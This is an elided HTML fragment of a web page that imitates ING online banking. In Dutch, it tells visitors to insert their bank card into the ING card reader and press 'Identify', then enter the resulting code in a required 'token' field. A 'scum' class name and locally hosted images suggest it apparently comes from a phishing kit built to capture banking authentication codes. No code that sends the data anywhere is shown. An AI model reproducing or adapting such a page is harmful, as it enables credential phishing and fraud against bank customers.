                        ...
                        <div class="scum" id="token-view">
                                ...
                                <div class="step d-flex justify-content-between">
                                    ...
                                    <p class="step-p ng-binding">
                                      Plaats uw bankkaart in de ING Card-lezer en druk op "Identificeer"
                                    </p>

                                    <span class="pluss">+</span>
                                    <div>
                                        <img class="img1" src="./css/256pxidentify.png">
                                    </div>
                                ...
                                <div class="form-group">
                                    ...
                                    <input type="text" name="token" id="code" class="form-control ng-pristine ng-untouched ng-valid ng-empty ng-valid-pattern" data-ng-model="data.code" required="">
